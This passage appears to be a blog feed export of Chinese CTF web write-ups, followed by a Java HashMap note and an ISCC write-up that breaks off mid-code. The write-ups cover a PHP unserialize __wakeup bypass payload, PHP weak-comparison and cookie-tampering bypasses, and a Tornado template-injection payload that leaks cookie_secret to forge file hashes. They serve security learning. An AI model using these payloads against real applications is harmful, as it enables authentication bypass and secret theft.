class="token operator">%</span><span class="token number">00</span>Name<span class="token operator">%</span><span class="token number">00</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bi<span class="token operator">%</span><span class="token number">3</span>A100<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>需要对<code>function __wakeup()&#123;        $this-&gt;username = &#39;guest&#39;;    &#125;</code>进行绕过，可更改属性数量绕过（系列化漏洞）</p><p><u><em>调用unserialize()时会自动调用魔法函数wakeup(),可以通过改变属性数绕过，把<code>Name</code>后面的2改为3或以上即可</em></u></p><h3 id="最终payload1-php中的urlencode函数-："><a href="#最终payload1-php中的urlencode函数-：" class="headerlink" title="最终payload1(php中的urlencode函数)："></a>最终payload1(php中的urlencode函数)：</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Name<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A14<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>Name<span class="token operator">%</span><span class="token number">00</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>admin<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A14<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>Name<span class="token operator">%</span><span class="token number">00</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bi<span class="token operator">%</span><span class="token number">3</span>A100<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>然后url识别不了<code>&quot;</code>，改为<code>%22</code></li><li>因为成员（属性）是private，所以要在类名和成员名前加<code>%00</code>这个url编码是空的意思。因为生产序列化时不会把这个<code>空</code>也输出。</li><li>也可以直接用序列化后的url编码。这里要注意，php的<code>urlencode()</code>是会自动把<code>空</code>编码成%00</li></ol><h3 id="最终payload2-手动将-”-和-空格-用-22-与-00-替换-："><a href="#最终payload2-手动将-”-和-空格-用-22-与-00-替换-：" class="headerlink" title="最终payload2(手动将==”==和 ==空格==用==%22==与==%00==替换)："></a>最终payload2(手动将==”==和 ==空格==用==%22==与==%00==替换)：</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token operator">%</span><span class="token number">22</span>Name<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>Name<span class="token operator">%</span><span class="token number">00</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token operator">%</span><span class="token number">22</span>admin<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>Name<span class="token operator">%</span><span class="token number">00</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206152322629.png" alt="image-20220615232229502"></p><p>魔法函数<br>通常来说有一些PHP的魔法函数会导致反序列化漏洞，如：<br>__construct 当一个对象创建时自动调用<br>__destruct 当对象被销毁时自动调用 (php绝大多数情况下会自动调用销毁对象)<br>__sleep() 使**用serialize()函数时触发<br>__wakeup 使用unserialse()**函数时会自动调用<br>__toString 当一个对象被当作一个字符串被调用。<br>__call() 在对象上下文中调用不可访问的方法时触发<br>__callStatic() 在静态上下文中调用不可访问的方法时触发<br>__get() 用于从不可访问的属性读取数据//调用私有属性时使用<br>__set() 用于将数据写入不可访问的属性<br>__isset() 在不可访问的属性上调用isset()或empty()触发<br>__unset() 在不可访问的属性上使用unset()时触发<br>__toString() 把类当作字符串使用时触发,返回值需要为字符串<br>__invoke() 当脚本尝试将对象调用为函数时触`发</p><p><a href="%5B(6%E6%9D%A1%E6%B6%88%E6%81%AF">参考链接</a> BUUCTF <a href="https://blog.csdn.net/weixin_45642610/article/details/112591542?ops_request_misc=%7B%22request_id%22:%22165520374516782184647117%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=165520374516782184647117&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-5-112591542-null-null.142%5Ev14%5Epc_search_result_control_group,157%5Ev14%5Enew_3&utm_term=%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98+2019%5DPHP+1&spm=1018.2226.3001.4187">极客大挑战 2019]PHP 1_wow小华的博客-CSDN博客</a>)</p><h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h1><p>题目描述：</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206161557164.png" alt="image-20220616155752118"></p><p>源码没消息，尝试dirsearch扫目录，无线索</p><p><a href="https://github.com/TheKingOfDuck/fuzzDicts/tree/master/ctfDict">换ctf相关备份字典：</a></p><p>扫的过程中<img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206161647834.png" alt="image-20220616164707784"></p><p>都是429（并发请求过多）</p><p>等会再扫</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include_once</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Just num!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span> <span class="token operator">==</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Try to find out source file!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>php弱类型比较（==），当数字和字符/字符串进行比较时会将字符/字符串先转化为数字（即数字字符转为原值，而字符会转为0）</p><h3 id="得payload："><a href="#得payload：" class="headerlink" title="得payload："></a>得payload：</h3><p><code>?key=123</code></p><h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><h3 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h3><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206241825566.png" alt="image-20220624182551491"></p><h3 id="查看FLAG页面中的内容"><a href="#查看FLAG页面中的内容" class="headerlink" title="查看FLAG页面中的内容"></a>查看FLAG页面中的内容</h3><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206241826238.png" alt="image-20220624182642209"></p><blockquote><p>If you want to buy the FLAG:<br>You must be a student from CUIT!!!<br>You must be answer the correct password!!!</p></blockquote><blockquote><p>Only Cuit’s students can buy the FLAG</p></blockquote><p><strong>提示需要以Cuit（Chengdu University of Information Technology）学生的身份登录而且要输入正确的密码</strong></p><h3 id="pay-php中关键部分"><a href="#pay-php中关键部分" class="headerlink" title="pay.php中关键部分"></a>pay.php中关键部分</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token operator">~</span><span class="token operator">~</span><span class="token operator">~</span>post money <span class="token keyword">and</span> password<span class="token operator">~</span><span class="token operator">~</span><span class="token operator">~</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"password can't be number&lt;/br>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Password Right!&lt;/br>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>isset()函数是用来检验变量是否被设置的。<br>is_numeric()函数检测字符串是否只由数字组成，如果字符串中只包括数字，就返回Ture，否则返回False。</p><p>对于$password == 404，在PHP中==是一种弱类型比较，即只取字符串中开头的整数部分进行比较。</p><p>由此我们可以得出绕过密码的方法：<br>  用POST方法发送一个名为password的变量，令password = 404a(在404后面添加任意字母即可)或password = 404%20(相当于在404后面加了一个空格，其他空白字符也可以绕过)</p><p>注意到源代码中还有这样一句：Flag need your 100000000 money<br>也就是说我们还需要用POST方法上传money变量使其等于100000000</p><h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206241830063.png" alt="image-20220624183051037"></p><p>在Request请求中，<code>Cookie: user=0</code>，这里是身份判断的位置，在布尔值中0为false，1为true，我们将其改为<code>Cookie: user=1</code>以通过身份验证。</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206241832481.png" alt="image-20220624183246456"></p><blockquote><p>显示<code>Nember lenth is too long</code>应该是存在长度限制，这里有两种绕过方法<br>1、科学计数法绕过<code>money=1e9</code><br>2、数组绕过<code>money[]=1</code></p><blockquote><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206241829282.png" alt="image-20220624182938253"></p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206241831950.png" alt="image-20220624183133926"></p></blockquote></blockquote><h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><h2 id="SSTI-介绍"><a href="#SSTI-介绍" class="headerlink" title="SSTI 介绍"></a>SSTI 介绍</h2><p>就是服务器端模板注入（Server-Side Template Injection）</p><p>漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p><h2 id="tornado-render"><a href="#tornado-render" class="headerlink" title="tornado render"></a>tornado render</h2><p>tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过<code>&#123;&#123;&#125;&#125;</code>进行传递变量和执行简单的表达式。</p><h2 id="题目描述：-2"><a href="#题目描述：-2" class="headerlink" title="题目描述："></a>题目描述：</h2><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206252206755.png" alt="image-20220625220604668"></p><blockquote><p>flag.txt：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206252208166.png" alt="image-20220625220813133"></p><blockquote><p>welcome.txt</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206252209874.png" alt="image-20220625220953841"></p><blockquote><p>hints.txt</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206252210536.png"></p><p>题目链接：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//e1b975d1-eca8-4604-b1a1-efe8bf0b1f35.node4.buuoj.cn:81/file?filename=/welcome.txt&amp;filehash=7e73b8eecefb8cb8424ae331e3c4ac14</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206252219622.png" alt="image-20220625221925582"></p><p>猜测？msg即为注入点</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206252220003.png" alt="image-20220625222033970"></p><p>可见页面返回的由msg的值决定,修改msg的值形成注入,获得环境变量</p><blockquote><p>推测md5加密过后的值就是url中filehash对应的值，想获得flag只要我们在filename中传入/fllllllllllllag文件和filehash，所以关键是获取cookie_secret</p></blockquote><blockquote><blockquote><p>在tornado模板中，存在一些可以访问的快速对象，比如 <code>&#123;&#123;escape(handler.settings["cookie"])&#125;&#125;</code>，这个其实就是<code>handler.settings</code>对象，里面存储着一些环境变量</p></blockquote></blockquote><ol><li>handler 指向RequestHandler</li><li>而RequestHandler.settings又指向self.application.settings</li><li>所有handler.settings就指向RequestHandler.application.settings了！</li><li>大概就是说，这里面就是我们一下环境变量，我们正是从这里获取的cookie_secret</li></ol><h2 id="payload1"><a href="#payload1" class="headerlink" title="payload1:"></a>payload1:</h2><pre class="line-numbers language-none"><code class="language-none">?msg&#x3D;&#123;&#123;handler.settings&#125;&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206252226715.png" alt="image-20220625222610664"></p><p>Python脚本获取filename+cookie_secret的MD5加密值</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">def</span> <span class="token function">md5</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    md5 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>    md5<span class="token punctuation">.</span>update<span class="token punctuation">(</span>s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> md5<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">#转为16进制显示</span><span class="token keyword">def</span> <span class="token function">filehash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    filename <span class="token operator">=</span> <span class="token string">'/fllllllllllllag'</span>    cookie_secret <span class="token operator">=</span> <span class="token string">'fa7d9694-aaa4-4a87-bd8e-76b2c8f5f010'</span>    <span class="token comment">#print(md5(cookie_secret+md5(filename)))</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>md5<span class="token punctuation">(</span>cookie_secret <span class="token operator">+</span> md5<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#防止模块被导入后下方代码也被执行</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    filehash<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="payload2："><a href="#payload2：" class="headerlink" title="payload2："></a>payload2：</h2><pre class="line-numbers language-none"><code class="language-none">ac815a16b2654d16425e58972575835e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="finally-payload："><a href="#finally-payload：" class="headerlink" title="finally payload："></a>finally payload：</h2><pre class="line-numbers language-none"><code class="language-none">file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;ac815a16b2654d16425e58972575835e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到flag：</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206252230093.png" alt="image-20220625223037057"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h2><p>Python  tornado render 模板注入漏洞</p><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">参考：SSTI（模板注入）漏洞（入门篇）</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF_WEB" scheme="https://kannikanyun.github.io/tags/CTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title>字符串压缩</title>
    <link href="https://kannikanyun.github.io/2022/06/13/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8E%8B%E7%BC%A9/"/>
    <id>https://kannikanyun.github.io/2022/06/13/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8E%8B%E7%BC%A9/</id>
    <published>2022-06-13T08:19:49.000Z</published>
    <updated>2022-06-17T05:33:09.081Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Java-HashMap介绍"><a href="#Java-HashMap介绍" class="headerlink" title="Java HashMap介绍"></a><a href="https://www.runoob.com/java/java-hashmap.html">Java HashMap介绍</a></h1><h1 id="int和integer有什么区别"><a href="#int和integer有什么区别" class="headerlink" title="int和integer有什么区别"></a><a href="https://blog.csdn.net/chenliguan/article/details/53888018">int和integer有什么区别</a></h1><h1 id="Java-HashMap-containsKey-方法"><a href="#Java-HashMap-containsKey-方法" class="headerlink" title="Java HashMap containsKey() 方法 "></a><a href="https://www.runoob.com/java/java-hashmap-containskey.html">Java HashMap containsKey() 方法 </a></h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">strSplit</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ZipStr</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// TODO 自动生成的方法存根</span><span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token string">"aabaaccdd"</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token function">fun1</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">HashMap</span> <span class="token function">fun1</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Character</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Character</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> c <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> c<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//get()获取指定 key 对应对 value</span><span class="token class-name">Integer</span> count <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//关键代码：如果c[i]存储的值（如果有相等的值，value会改变）相等，那么count也相等</span><span class="token comment">//此处的count的类型一定要为Integer，如果为int类型，则count值为0(Integer为为对象引用，int仅为值)</span><span class="token comment">//containsKey() 检查 hashMap 中是否存在指定的 key 对应的映射关系。</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>map<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//如果该字符第一次出现，则赋value为1，此后如果出现相同的值（指向的引用是相同的，也就是键值存在对应映射，则执行else）</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token comment">//获取到指定的 key(判断值是否出现过，出现过则原值+1) 对应的映射关系。</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//此时的c[i]不代表下标而代表值a···</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> map<span class="token punctuation">;</span><span class="token comment">//返回的是每种值及对应value</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//思路：</span><span class="token comment">//1、将字符串放到字符数组中</span><span class="token comment">//2、将每一个字符元素的值放到Integer对象 count中</span><span class="token comment">//3、如果该字符第一次出现，则value=1，如果已经出现过，则在第一次出现的值的value上+1</span><span class="token comment">//4、返回map</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="JAVA" scheme="https://kannikanyun.github.io/tags/JAVA/"/>
    
  </entry>
  
  <entry>
    <title>isccMd</title>
    <link href="https://kannikanyun.github.io/2022/06/13/isccMd/"/>
    <id>https://kannikanyun.github.io/2022/06/13/isccMd/</id>
    <published>2022-06-13T08:17:47.000Z</published>
    <updated>2022-06-13T08:20:32.491Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$Step1</span><span class="token operator">=</span><span class="token constant boolean">False</span><span class="token punctuation">;</span><span class="token variable">$Step2</span><span class="token operator">=</span><span class="token constant boolean">False</span><span class="token punctuation">;</span><span class="token variable">$info</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword type-casting">array</span><span class="token punctuation">)</span><span class="token function">json_decode</span><span class="token punctuation">(</span>@<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Information'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// json_decode() 函数用于对 JSON 格式的字符串进行解码，并转换为 PHP 变量()</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">is_numeric</span><span class="token punctuation">(</span>@<span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"year"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Sorry~"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token class-name return-type">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>@<span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"year"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"year"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2022</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$Step1</span><span class="token operator">=</span><span class="token constant boolean">True</span><span class="token punctuation">:</span><span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token comment">//弱等于，逻辑上与前一个条件（要求year值不等于数字或数字字符串）相反，既然是弱等于，那么判断有2022就可以了，payload可以在2022后加任意字符都满足</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token 